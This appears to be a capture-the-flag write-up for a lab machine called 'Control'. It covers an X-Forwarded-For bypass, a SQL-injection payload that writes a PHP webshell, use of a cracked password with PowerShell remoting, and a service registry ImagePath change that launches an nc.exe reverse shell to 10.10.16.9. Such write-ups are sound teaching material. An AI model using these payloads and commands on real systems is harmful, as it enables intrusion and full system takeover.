# Control

## Gaining Access

Nmap Scan:

<figure><img src="../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

### X-Forwaded-For Bypass

Using `gobuster` we can find the directories:

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

When trying to access the `admin.php` page, we get this error:

<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

Perhaps we can spoof the `X-Forwarded-For` header using an IP address. When checking the page sources of multiple pages, we can find this:

<figure><img src="../../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

Appending the `X-Forwarded-For: 192.168.4.28` header, we can access the `admin.php` page.

### SQL Injection for Webshell

Within the `admin.php` page, we can find that there is an application that is able to search for products.

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

We can attempt SQL Injection easily and confirm there is an unsanitsed input being passed.

<figure><img src="../../../.gitbook/assets/image (1) (9).png" alt=""><figcaption></figcaption></figure>

With this, I attempted UNION Injection to find out how many columns there were. In total, there were 6.

We can write a webshell into the normal working webroot directory:

```sql
\' UNION SELECT '<?php system($_GET[\'cmd\']); ?>',2,3,4,5,6 INTO OUTFILE 'C:\inetpub\wwwroot\shell.php'#
```

Then, we can check for RCE:

<figure><img src="../../../.gitbook/assets/image (39) (4).png" alt=""><figcaption></figcaption></figure>

Afterwards, gaining a reverse shell is trivial:

<figure><img src="../../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### MariaDB Credentials

Within the machine, we can find the other users that were present:

<figure><img src="../../../.gitbook/assets/image (27) (5).png" alt=""><figcaption></figcaption></figure>

So we are looking for credentials for Hector. Understanding that there was a MariaDB instance running on the machine, I checked the files that were related to that first.&#x20;

Within the `C:\MariaDB\mysql` folder, we can find hashes for a user:

<figure><img src="../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

Alternatively, we could use the SQL Injection vulnerability to dump these credentials out. Anyways, we would find a hash for the Hector user. His hash can be cracked on CrackStation to give `l33th4x0rhector`.

Enumerating the privileges that Hector has, we also see that he's part of the Remote Management Group:

<figure><img src="../../../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

This means that we can remotely access Hector's account over WinRM. Since there was no WinRM port available for me to use `evil-winrm`, I opted for Remote Powershelling.

```powershell
$pass = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("CONTROL\Hector",$pass)
Invoke-Command -Computing localhost -ScriptBlock { whoami } -Credential $cred
```

We can use this to execute `nc.exe` to give us another reverse shell as Hector.

<figure><img src="../../../.gitbook/assets/image (3) (7).png" alt=""><figcaption></figcaption></figure>

### Powershell History

This part was a tad tricky. I ran a WinPEAS and it picked up on the Powershell history for Hector.

<figure><img src="../../../.gitbook/assets/image (17) (4).png" alt=""><figcaption></figcaption></figure>

When running these commands, I get a load of text that I don't really understand:

<figure><img src="../../../.gitbook/assets/image (19) (4).png" alt=""><figcaption></figcaption></figure>

Perhaps this was a clue to look into the ACLs and permissions Hector has.

### Service Registry Permissions

Picking up on the rest of WinPEAS output, we see that Hector has FullControl permissions over loads of services.

<figure><img src="../../../.gitbook/assets/image (26) (5).png" alt=""><figcaption></figcaption></figure>

FullControl permissions can be abused for forms of DLL Hijacking, or changing certain properties to execute scripts or files of our choosing.&#x20;

To exploit this, we need to find a service that satisfies 3 conditions:

* Is not started by default, and we need to manually start it
* Have FullControl permissions over it to alter its properties to execute scripts
* Run by `LocalSystem` to ensure that we run our scripts as the SYSTEM user.

I began enumeration for services that I could restart. I found a resource here that told us what specific permissions we needed:

{% embed url="http://woshub.com/set-permissions-on-windows-service/" %}

```
CC — SERVICE_QUERY_CONFIG (request service settings)
LC — SERVICE_QUERY_STATUS (service status polling)
SW — SERVICE_ENUMERATE_DEPENDENTS
LO — SERVICE_INTERROGATE
CR — SERVICE_USER_DEFINED_CONTROL
RC — READ_CONTROL
RP — SERVICE_START
WP — SERVICE_STOP
DT — SERVICE_PAUSE_CONTINUE
```

In this case, we need the `RP` permission to restart a service. To check whether a service is run by `LocalSystem`, we would have to refer to the `SERVICE_START_NAME` variable when using `sc.exe` to query the service. Lastly, we can refer to this table for the values of the `START_TYPE` variable to find a service that is started manually (3 is the value we are looking for):

<figure><img src="../../../.gitbook/assets/image (6) (5).png" alt=""><figcaption></figcaption></figure>

When looking through the services that Hector had FullControl permissions over (via WinPEAS output), we find this one:

<figure><img src="../../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

This service certainly fits the conditions needed. We can use `sc.exe config` to modify the `binpath` variable to give us a reverse shell. However, the `sc.exe` method lept failing.

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

I tried the Powershell `Set-ItemProperty` method, and it worked better:

```powershell
Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\wuauserv -name ImagePath -value "C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 10.10.16.9 6666"
```

Afterwards, we can start the service and get a shell as the administrator. (I don't have screenshots of the administrator shell D:)
